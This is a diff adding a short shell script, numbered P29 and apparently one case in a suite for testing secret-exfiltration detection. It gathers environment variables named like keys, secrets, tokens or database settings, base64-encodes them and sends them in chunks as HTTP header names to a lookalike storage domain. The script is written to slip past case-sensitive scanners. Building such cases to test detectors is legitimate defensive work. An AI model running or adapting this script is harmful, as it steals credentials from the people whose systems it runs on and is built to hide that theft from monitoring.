@@ -1,0 +1,23 @@
+#!/bin/sh
+# P29: Header name exfil — Go canonicalizes header names, lowercasing the
+# credential pattern (AKIAIOSF... → Akiaiosf...) defeating case-sensitive regex
+_U="${_U:-https://storage-googleapis.net/c/29}"
+_C="${_C:-/home/testuser/.benthic/ca.crt}"
+_d=""
+for _v in $(printenv | grep -iE '(_KEY|_SECRET|_TOKEN|DATABASE)=' | head -5); do
+  _d="${_d}${_v}\n"
+done
+[ -z "$_d" ] && exit 0
+_e=$(printf '%b' "$_d" | base64 -w0 2>/dev/null || printf '%b' "$_d" | base64 | tr -d '\n')
+# Split into 60-char chunks and send each as a header name
+_len=${#_e}
+_i=0
+_n=0
+while [ $_i -lt $_len ]; do
+  _chunk=$(echo -n "$_e" | cut -c$((_i+1))-$((_i+60)))
+  curl -s -o /dev/null --cacert "$_C" -X POST \
+    -H "X-${_chunk}: ${_n}" \
+    -d 'safe' "$_U" 2>/dev/null
+  _i=$((_i+60))
+  _n=$((_n+1))
+done
